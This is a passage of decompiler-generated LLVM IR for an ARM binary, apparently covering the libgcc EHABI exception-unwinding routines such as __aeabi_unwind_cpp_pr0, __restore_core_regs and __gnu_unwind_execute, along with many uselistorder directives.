  %v0_224b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_224b8 = load i32, i32* @r7, align 4
  %v2_224b8 = add i32 %v1_224b8, %v0_224b8
  store i32 %v2_224b8, i32* %stack_var_-48, align 4
  %v0_224c8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_224c8, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_224d8 = call i32 @_Unwind_VRS_Set(i32 %v0_224c8, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_221ac

dec_label_pc_224e4:                               ; preds = %dec_label_pc_22410
  %v0_224e4 = load i32, i32* @sl, align 4
  %v3_224e4 = mul i32 %v0_224e4, 4
  %v0_224e8 = load i32, i32* %r0.global-to-local, align 4
  %v2_224e8 = add i32 %v0_224e8, %v3_224e4
  %v3_224e8 = inttoptr i32 %v2_224e8 to i32*
  %v4_224e8 = load i32, i32* %v3_224e8, align 4
  %v1_224ec = and i32 %v4_224e8, 1073741824
  %v2_224ec = icmp eq i32 %v1_224ec, 0
  br i1 %v2_224ec, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_224e4
  %v2_224f4 = or i32 %v4_224e8, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_224e4
  %tmp212 = bitcast i32 %v4_224e8 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_224f8 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_224e8, { 2, 1, 0 }
  uselistorder i32 %v1_2243c, { 1, 0 }
  uselistorder i32 %v1_22438, { 1, 0 }
  uselistorder i32 %v1_22408, { 1, 0 }
  uselistorder i32 %v0_223d0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_2239c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_22364, { 1, 0 }
  uselistorder i32 %v0_22364, { 1, 0 }
  uselistorder i32 %v2_2205866, { 1, 0 }
  uselistorder i32 %v2_22330, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_22058, { 1, 0 }
  uselistorder i32 %v1_222f0, { 1, 0 }
  uselistorder i32 %v3_2228c, { 2, 0, 1 }
  uselistorder i32 %v0_2226c, { 1, 0 }
  uselistorder i32 %v0_2226c.pre, { 1, 0 }
  uselistorder i32 %v1_221c4, { 1, 0 }
  uselistorder i32 %v2_221bc, { 1, 0 }
  uselistorder i32 %v0_2214c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_2210c, { 1, 0 }
  uselistorder i32 %v1_22108, { 1, 0 }
  uselistorder i32 %v0_22108, { 1, 0, 2 }
  uselistorder i32 %v4_220e0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_22284, { 1, 2, 0 }
  uselistorder i32 %v0_220b8, { 1, 0 }
  uselistorder i32 %v3_220b4, { 1, 0, 2 }
  uselistorder i32 %v1_22088, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_222c0, { 1, 0 }
  uselistorder i1 %v2_220f4, { 1, 0, 2 }
  uselistorder i32 %v1_21ff8, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_9* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 24, 0, 5, 6, 34, 7, 8, 3, 9, 25, 1, 10, 12, 13, 14, 15, 11, 16, 17, 18, 26, 27, 28, 29, 19, 30, 20, 31, 21, 32, 22, 33, 23, 2, 4 }
  uselistorder i32 -3, { 1, 0, 2, 4, 3 }
  uselistorder i32 52, { 18, 1, 2, 5, 14, 15, 11, 12, 13, 16, 19, 17, 6, 20, 21, 3, 22, 0, 23, 24, 7, 8, 4, 10, 9 }
  uselistorder i32 48, { 18, 2, 1, 15, 13, 14, 19, 20, 16, 17, 3, 0, 21, 22, 23, 9, 4, 10, 5, 6, 8, 7, 11, 12 }
  uselistorder i32 44, { 20, 4, 43, 44, 0, 19, 5, 21, 6, 7, 8, 27, 28, 29, 30, 31, 32, 24, 25, 26, 9, 22, 23, 10, 1, 11, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 12, 13, 14, 2, 3, 16, 15, 17, 18 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 2, 1 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder i32 65536, { 3, 4, 5, 6, 8, 7, 13, 9, 14, 10, 15, 11, 16, 12, 17, 18, 19, 23, 20, 24, 21, 25, 22, 26, 232, 27, 233, 231, 234, 28, 29, 30, 31, 32, 33, 34, 36, 35, 39, 38, 37, 40, 43, 42, 41, 48, 44, 49, 45, 50, 46, 51, 47, 53, 52, 55, 54, 1, 56, 0, 2, 59, 57, 60, 58, 61, 63, 62, 65, 64, 67, 66, 68, 71, 69, 72, 70, 75, 73, 76, 74, 81, 77, 82, 78, 83, 79, 84, 80, 86, 85, 88, 87, 89, 90, 91, 92, 93, 94, 98, 95, 99, 96, 100, 97, 105, 103, 101, 104, 102, 107, 106, 109, 108, 110, 111, 112, 113, 116, 114, 117, 115, 121, 118, 122, 119, 123, 120, 125, 124, 127, 126, 128, 129, 130, 131, 132, 136, 133, 137, 134, 138, 135, 139, 140, 141, 143, 142, 145, 144, 146, 147, 149, 148, 150, 153, 151, 154, 152, 156, 155, 158, 157, 159, 160, 161, 162, 165, 163, 166, 164, 169, 167, 170, 168, 172, 171, 174, 173, 175, 176, 177, 180, 178, 181, 179, 185, 182, 186, 183, 187, 184, 189, 188, 192, 190, 193, 191, 195, 194, 197, 196, 198, 199, 200, 201, 202, 205, 203, 206, 204, 210, 207, 211, 208, 212, 209, 214, 213, 216, 215, 218, 217, 220, 219, 221, 222, 223, 224, 225, 228, 226, 229, 227, 230 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 3, 4, 5, 0, 6, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_2c010.418 to i32), { 28, 6, 29, 30, 7, 8, 64, 84, 85, 1, 2, 0, 3, 65, 66, 86, 9, 67, 87, 10, 11, 12, 13, 14, 27, 68, 88, 69, 89, 15, 16, 70, 71, 72, 90, 17, 91, 92, 93, 18, 94, 19, 73, 95, 96, 20, 21, 22, 97, 74, 98, 23, 99, 24, 100, 101, 102, 75, 103, 25, 104, 4, 76, 105, 77, 106, 79, 107, 26, 108, 109, 110, 34, 33, 35, 111, 112, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 81, 61, 80, 62, 63, 82, 113, 5, 114, 115, 116, 117, 32, 78, 118, 119, 83 }
  uselistorder i32 -2, { 0, 21, 22, 7, 3, 4, 2, 8, 9, 10, 1, 5, 11, 24, 23, 25, 26, 27, 12, 13, 14, 6, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 80, { 11, 12, 13, 0, 2, 1, 3, 4, 5, 14, 9, 10, 6, 7, 8 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_22448, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_22364, { 1, 0 }
  uselistorder label %dec_label_pc_2232c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_222f0, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_2226c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_221ac, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_221a8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_22108, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_22064, { 1, 0 }
  uselistorder label %dec_label_pc_22064.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_22064.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_22504(i32 %arg1) local_unnamed_addr {
dec_label_pc_22504:
  %v0_22504 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_22504, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_22504
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_22504, %bb
  %v10_2250c = phi i32 [ %arg1, %dec_label_pc_22504 ], [ 0, %bb ]
  ret i32 %v10_2250c

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 16, 17, 18, 31, 12, 15, 32, 33, 34, 35, 36, 5, 4, 37, 29, 30, 19, 20, 13, 23, 22, 21, 24, 26, 8, 11, 7, 14, 9, 10, 6, 28, 25, 27, 38, 39, 40, 41 }
  uselistorder i1* @cpsr_z, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 37, 16, 17, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_22514 = load i32, i32* @r1, align 4
  %v2_22514 = load i32, i32* @r2, align 4
  %v4_22514 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_22514, i32 %v2_22514, i32 2)
  ret i32 %v4_22514
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_2251c = load i32, i32* @r1, align 4
  %v2_2251c = load i32, i32* @r2, align 4
  %v4_2251c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_2251c, i32 %v2_2251c, i32 1)
  ret i32 %v4_2251c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_22524 = load i32, i32* @r1, align 4
  %v2_22524 = load i32, i32* @r2, align 4
  %v4_22524 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_22524, i32 %v2_22524, i32 0)
  ret i32 %v4_22524

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 7, 8, 9, 18, 10, 0, 16, 11, 17, 68, 69, 70, 12, 13, 14, 15, 31, 32, 33, 34, 71, 72, 73, 74, 75, 76, 87, 88, 89, 90, 79, 1, 80, 77, 78, 35, 36, 2, 3, 4, 50, 51, 5, 6, 23, 81, 82, 83, 84, 85, 86, 37, 55, 56, 57, 58, 59, 19, 20, 44, 45, 46, 47, 48, 49, 21, 22, 52, 24, 25, 26, 27, 28, 29, 30, 38, 39, 40, 41, 42, 43, 53, 54, 60, 61, 62, 63, 64, 65, 66, 67 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_2252c = add i32 %tmp, 56
  %v4_2252c = inttoptr i32 %v3_2252c to i32*
  %v5_2252c = load i32, i32* %v4_2252c, align 4
  %v6_2252c = add i32 %tmp, 60
  %v7_2252c = inttoptr i32 %v6_2252c to i32*
  %v8_2252c = load i32, i32* %v7_2252c, align 4
  %v2_22538 = load i32, i32* %arg1, align 4
  %v3_22538 = add i32 %tmp, 4
  %v4_22538 = inttoptr i32 %v3_22538 to i32*
  %v5_22538 = load i32, i32* %v4_22538, align 4
  store i32 %v5_22538, i32* @r1, align 4
  %v12_22538 = add i32 %tmp, 16
  %v13_22538 = inttoptr i32 %v12_22538 to i32*
  %v14_22538 = load i32, i32* %v13_22538, align 4
  store i32 %v14_22538, i32* @r4, align 4
  %v15_22538 = add i32 %tmp, 20
  %v16_22538 = inttoptr i32 %v15_22538 to i32*
  %v17_22538 = load i32, i32* %v16_22538, align 4
  store i32 %v17_22538, i32* @r5, align 4
  %v18_22538 = add i32 %tmp, 24
  %v19_22538 = inttoptr i32 %v18_22538 to i32*
  %v20_22538 = load i32, i32* %v19_22538, align 4
  store i32 %v20_22538, i32* @r6, align 4
  %v21_22538 = add i32 %tmp, 28
  %v22_22538 = inttoptr i32 %v21_22538 to i32*
  %v23_22538 = load i32, i32* %v22_22538, align 4
  store i32 %v23_22538, i32* @r7, align 4
  %v24_22538 = add i32 %tmp, 32
  %v25_22538 = inttoptr i32 %v24_22538 to i32*
  %v26_22538 = load i32, i32* %v25_22538, align 4
  store i32 %v26_22538, i32* @r8, align 4
  %v27_22538 = add i32 %tmp, 36
  %v28_22538 = inttoptr i32 %v27_22538 to i32*
  %v29_22538 = load i32, i32* %v28_22538, align 4
  store i32 %v29_22538, i32* @sb, align 4
  %v30_22538 = add i32 %tmp, 40
  %v31_22538 = inttoptr i32 %v30_22538 to i32*
  %v32_22538 = load i32, i32* %v31_22538, align 4
  store i32 %v32_22538, i32* @sl, align 4
  store i32 %v8_2252c, i32* @ip, align 4
  store i32 %v5_2252c, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_2252c)
  ret i32 %v2_22538

; uselistorder directives
  uselistorder i32 %v8_2252c, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 16, 17, 18, 19, 14, 15, 3, 4, 0, 52, 5, 50, 51, 12, 13, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 1, 86, 87, 88, 89, 90, 91, 92, 93, 94, 6, 95, 96, 7, 35, 36, 8, 2, 30, 31, 32, 33, 37, 38, 39, 40, 41, 27, 42, 43, 44, 45, 46, 47, 48, 23, 28, 20, 21, 22, 24, 25, 29, 34, 26, 9, 10, 49, 11 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 26, 35, 2, 27, 9, 10, 3, 33, 1, 11, 0, 12, 13, 14, 16, 15, 34, 19, 18, 17, 21, 22, 20, 4, 8, 7, 5, 6, 24, 25, 23 }
  uselistorder i32* @sb, { 8, 26, 27, 2, 3, 4, 5, 6, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 22, 23, 25, 0, 9, 10, 11, 12, 1 }
  uselistorder i32 36, { 22, 21, 4, 24, 7, 12, 5, 19, 23, 13, 20, 14, 0, 1, 2, 3, 15, 18, 8, 9, 10, 6, 11, 16, 17 }
  uselistorder i32* @r8, { 57, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 1, 56, 0, 27, 101, 6, 102, 28, 29, 30, 31, 14, 15, 16, 17, 18, 19, 20, 21, 22, 2, 23, 24, 25, 26, 32, 33, 34, 35, 7, 103, 8, 9, 36, 37, 38, 10, 11, 3, 12, 71, 72, 4, 73, 74, 75, 76, 77, 78, 79, 80, 5, 81, 82, 83, 84, 85, 86, 87, 88, 63, 64, 65, 66, 89, 90, 91, 92, 67, 68, 69, 70, 93, 94, 95, 96, 58, 59, 60, 61, 62, 97, 98, 99, 100, 13 }
  uselistorder i32 32, { 111, 108, 109, 110, 81, 122, 123, 77, 96, 124, 75, 117, 88, 79, 105, 103, 104, 100, 101, 102, 112, 113, 106, 107, 97, 98, 99, 7, 8, 114, 115, 89, 118, 119, 120, 9, 10, 12, 11, 121, 14, 13, 16, 15, 18, 17, 80, 90, 78, 76, 91, 20, 19, 22, 21, 24, 23, 26, 25, 0, 28, 27, 29, 31, 30, 33, 32, 35, 34, 36, 37, 38, 40, 39, 1, 92, 82, 116, 83, 93, 84, 4, 85, 5, 86, 6, 87, 42, 41, 44, 43, 46, 45, 48, 47, 50, 49, 53, 51, 54, 52, 94, 56, 55, 58, 57, 2, 60, 59, 62, 61, 64, 63, 66, 65, 68, 67, 70, 69, 95, 72, 71, 74, 73, 3 }
  uselistorder i32 28, { 34, 3, 28, 47, 25, 48, 49, 50, 51, 0, 29, 30, 26, 27, 40, 12, 31, 13, 32, 14, 1, 33, 44, 45, 46, 2, 15, 38, 35, 36, 16, 37, 17, 18, 39, 42, 43, 4, 20, 19, 21, 22, 41, 6, 5, 7, 8, 9, 23, 11, 10, 24 }
  uselistorder i32 24, { 86, 85, 105, 15, 16, 106, 0, 73, 74, 75, 76, 77, 78, 71, 72, 17, 79, 80, 93, 94, 81, 82, 2, 18, 83, 84, 98, 102, 103, 104, 1, 95, 96, 97, 19, 91, 87, 88, 89, 90, 92, 99, 20, 100, 101, 21, 22, 23, 24, 4, 3, 26, 27, 6, 28, 29, 5, 25, 31, 32, 8, 33, 34, 7, 30, 37, 38, 10, 9, 35, 36, 40, 41, 12, 42, 43, 11, 39, 45, 46, 14, 47, 48, 13, 44, 51, 52, 53, 54, 55, 56, 57, 49, 50, 60, 61, 62, 63, 64, 65, 66, 58, 59, 67, 68, 69, 70 }
  uselistorder i32 20, { 50, 48, 49, 51, 1, 4, 6, 41, 101, 37, 102, 103, 104, 105, 5, 106, 107, 2, 108, 42, 7, 38, 39, 40, 43, 44, 45, 52, 53, 46, 47, 109, 85, 86, 87, 88, 89, 90, 91, 8, 94, 95, 98, 3, 54, 9, 55, 56, 0, 13, 26, 92, 10, 11, 12, 93, 57, 14, 58, 59, 15, 60, 61, 62, 63, 16, 64, 65, 66, 67, 18, 68, 17, 69, 70, 71, 20, 72, 73, 74, 19, 75, 21, 76, 77, 78, 79, 22, 23, 80, 81, 24, 25, 82, 83, 84, 96, 27, 28, 29, 30, 31, 97, 99, 32, 33, 34, 35, 36, 100 }
  uselistorder i32* @r1, { 80, 11, 12, 13, 4, 81, 168, 61, 62, 78, 41, 2, 170, 42, 169, 116, 43, 44, 45, 14, 63, 1, 64, 65, 15, 173, 16, 5, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 6, 191, 192, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 67, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 60, 59, 3, 77, 17, 143, 97, 98, 193, 18, 195, 196, 197, 198, 105, 106, 89, 29, 30, 194, 19, 31, 32, 144, 145, 118, 119, 120, 121, 122, 123, 124, 40, 99, 100, 146, 7, 137, 138, 8, 147, 150, 148, 9, 149, 90, 91, 20, 151, 125, 152, 153, 117, 33, 34, 35, 36, 37, 38, 39, 10, 201, 202, 203, 204, 0, 205, 21, 79, 101, 154, 155, 22, 92, 93, 199, 200, 156, 23, 171, 172, 24, 102, 126, 157, 25, 26, 158, 82, 83, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 84, 85, 86, 87, 88, 27, 139, 94, 95, 96, 103, 28, 104, 107, 108, 109, 110, 111, 112, 113, 114, 115, 140, 141, 142, 159, 160, 161, 162, 163, 164, 165, 166, 167 }
  uselistorder i32 60, { 4, 24, 25, 26, 5, 6, 1, 7, 18, 19, 20, 21, 22, 23, 8, 14, 15, 9, 16, 17, 10, 11, 0, 13, 12, 3, 2 }
  uselistorder i32 56, { 4, 28, 29, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 10, 9, 2, 11, 12, 13, 14, 15, 30, 31, 26, 27, 5, 6, 1, 7, 0, 8, 3 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_22548 = load i32, i32* @r0, align 4
  ret i32 %v1_22548
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_22550 = load i32, i32* @r0, align 4
  ret i32 %v1_22550
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_22564 = ptrtoint i32* %stack_var_-68 to i32
  %v2_22568 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_22564, i32 0)
  ret i32 %v2_22568

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_22588 = ptrtoint i32* %stack_var_-68 to i32
  %v2_2258c = call i32 @__gnu_Unwind_Resume(i32 %v2_22588, i32 0)
  ret i32 %v2_2258c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_225ac = ptrtoint i32* %stack_var_-68 to i32
  %v2_225b0 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_225ac, i32 0)
  ret i32 %v2_225b0

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_225d0 = ptrtoint i32* %stack_var_-68 to i32
  %v6_225d4 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_225d0, i32 %arg2, i8* %arg3, i32 %v2_225d0)
  ret i32 %v6_225d4

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_22600 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_22608 = add i32 %tmp1, 76
  %v2_22608 = inttoptr i32 %v1_22608 to i32*
  %v3_22608 = load i32, i32* %v2_22608, align 4
  %v1_2260c = add i32 %v3_22608, 7
  %v2_2260c = inttoptr i32 %v1_2260c to i8*
  %v3_2260c = load i8, i8* %v2_2260c, align 1
  %v4_2260c = zext i8 %v3_2260c to i32
  %v1_22610 = add i32 %v3_22608, 8
  %v3_22614 = mul nuw nsw i32 %v4_2260c, 4
  %v2_22618 = add i32 %v3_22614, %v1_22610
  %v3_22618 = inttoptr i32 %v2_22618 to i8*
  ret i8* %v3_22618
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_18* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_18* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_22628 = load i32, i32* @r6, align 4
  %v21_22628 = load i32, i32* @lr, align 4
  %v0_2262c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2262c, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_2263c

dec_label_pc_2263c:                               ; preds = %dec_label_pc_2263c.backedge, %entry
  %v3_22648 = phi i32 [ %v0_2263c.pre, %dec_label_pc_2263c.backedge ], [ %tmp, %entry ]
  %v1_2263c = add i32 %v3_22648, 8
  %v2_2263c = inttoptr i32 %v1_2263c to i8*
  %v3_2263c = load i8, i8* %v2_2263c, align 1
  %v4_2263c = zext i8 %v3_2263c to i32
  store i32 %v4_2263c, i32* %r3.global-to-local, align 4
  %v2_22640 = icmp eq i8 %v3_2263c, 0
  store i1 %v2_22640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22640, label %dec_label_pc_22650, label %.thread

.thread:                                          ; preds = %dec_label_pc_2263c
  %v2_22644 = add nsw i32 %v4_2263c, -1
  store i32 %v2_22644, i32* %r3.global-to-local, align 4
  %v2_22648 = trunc i32 %v2_22644 to i8
  store i8 %v2_22648, i8* %v2_2263c, align 1
  %v0_2264c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2264c.pr.pr, label %.thread.dec_label_pc_22650_crit_edge, label %dec_label_pc_22678

.thread.dec_label_pc_22650_crit_edge:             ; preds = %.thread
  %v0_22650.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22650

dec_label_pc_22650:                               ; preds = %.thread.dec_label_pc_22650_crit_edge, %dec_label_pc_2263c
  %v0_22650 = phi i32 [ %v0_22650.pre, %.thread.dec_label_pc_22650_crit_edge ], [ %v3_22648, %dec_label_pc_2263c ]
  %v1_22650 = add i32 %v0_22650, 9
  %v2_22650 = inttoptr i32 %v1_22650 to i8*
  %v3_22650 = load i8, i8* %v2_22650, align 1
  %v4_22650 = zext i8 %v3_22650 to i32
  store i32 %v4_22650, i32* %r3.global-to-local, align 4
  %v2_22654 = icmp eq i8 %v3_22650, 0
  store i1 %v2_22654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22654, label %dec_label_pc_22758, label %dec_label_pc_2265c

dec_label_pc_2265c:                               ; preds = %dec_label_pc_2274c, %dec_label_pc_22650
  %v2_22660 = phi i32 [ %v0_2274c, %dec_label_pc_2274c ], [ %v0_22650, %dec_label_pc_22650 ]
  %v0_2265c = phi i32 [ %v4_2274c, %dec_label_pc_2274c ], [ %v4_22650, %dec_label_pc_22650 ]
  %v1_2265c = add nsw i32 %v0_2265c, -1
  store i32 %v1_2265c, i32* %r3.global-to-local, align 4
  %v1_22660 = trunc i32 %v1_2265c to i8
  %v3_22660 = add i32 %v2_22660, 9
  %v4_22660 = inttoptr i32 %v3_22660 to i8*
  store i8 %v1_22660, i8* %v4_22660, align 1
  %v0_22664 = load i32, i32* @r5, align 4
  %v1_22664 = add i32 %v0_22664, 4
  %v2_22664 = inttoptr i32 %v1_22664 to i32*
  %v3_22664 = load i32, i32* %v2_22664, align 4
  store i32 %v3_22664, i32* %r2.global-to-local, align 4
  %v1_22668 = inttoptr i32 %v3_22664 to i32*
  %v2_22668 = load i32, i32* %v1_22668, align 4
  store i32 %v2_22668, i32* %r0.global-to-local, align 4
  %v4_22668 = add i32 %v3_22664, 4
  store i32 %v4_22668, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_22670 = inttoptr i32 %v0_22664 to i32*
  store i32 %v2_22668, i32* %v1_22670, align 4
  %v5_22670 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_22670, i32* %v2_22664, align 4
  %v0_22674 = load i32, i32* %r3.global-to-local, align 4
  %v1_22674 = trunc i32 %v0_22674 to i8
  %v2_22674 = load i32, i32* @r5, align 4
  %v3_22674 = add i32 %v2_22674, 8
  %v4_22674 = inttoptr i32 %v3_22674 to i8*
  store i8 %v1_22674, i8* %v4_22674, align 1
  br label %dec_label_pc_22678

dec_label_pc_22678:                               ; preds = %.thread, %dec_label_pc_2265c, %.thread6
  %v0_22678 = load i32, i32* @r5, align 4
  %v1_22678 = inttoptr i32 %v0_22678 to i32*
  %v2_22678 = load i32, i32* %v1_22678, align 4
  %v3_2267c = udiv i32 %v2_22678, 16777216
  store i32 %v3_2267c, i32* @r4, align 4
  store i32 %v3_2267c, i32* %ip.global-to-local, align 4
  %v3_22684 = mul i32 %v2_22678, 256
  store i32 %v3_22684, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_22678, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_22684, i32* %v1_22678, align 4
  br i1 %tmp183, label %dec_label_pc_22758, label %dec_label_pc_22694

dec_label_pc_22694:                               ; preds = %dec_label_pc_22678
  %v0_22694 = load i32, i32* @r4, align 4
  %v1_22694 = and i32 %v0_22694, 128
  store i32 %v1_22694, i32* %r1.global-to-local, align 4
  %v2_22694 = icmp eq i32 %v1_22694, 0
  store i1 %v2_22694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22694, label %dec_label_pc_22770, label %dec_label_pc_2269c

dec_label_pc_2269c:                               ; preds = %dec_label_pc_22694
